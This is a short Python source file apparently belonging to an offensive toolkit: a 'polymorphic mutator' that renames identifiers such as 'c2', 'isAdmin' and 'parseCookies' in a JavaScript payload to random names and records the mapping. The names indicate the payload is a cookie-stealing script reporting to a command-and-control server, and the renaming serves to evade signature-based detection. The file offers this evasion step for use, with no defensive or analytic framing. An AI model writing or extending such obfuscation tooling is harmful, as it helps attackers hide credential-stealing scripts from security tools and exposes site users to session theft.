import random
import string
import re

def generate_random_identifier(length=8):
    letters = string.ascii_lowercase
    return "_" + ''.join(random.choice(letters) for _ in range(length))

def mutate_payload(raw_js, target_url=""):
    try:
        # Strictly target core script identifiers; exclude dictionary words to protect JSON schemas
        var_map = {
            "c2": generate_random_identifier(10),
            "baseData": generate_random_identifier(9),
            "isAdmin": generate_random_identifier(8),
            "parseCookies": generate_random_identifier(12)
        }
        
        mutated_js = raw_js
        for original, decoy in var_map.items():
            mutated_js = re.sub(r'\b' + original + r'\b', decoy, mutated_js)

        mutation_metadata = {
            "engine": "AI-Polymorphic-Mutator-v1.5",
            "obfuscated_keys": len(var_map),
            "mapping_signature": var_map
        }

        return mutated_js, mutation_metadata
    except Exception as e:
        print(f"[-] Mutator exception: {e}")
        return raw_js, {"engine": "fallback", "obfuscated_keys": 0}
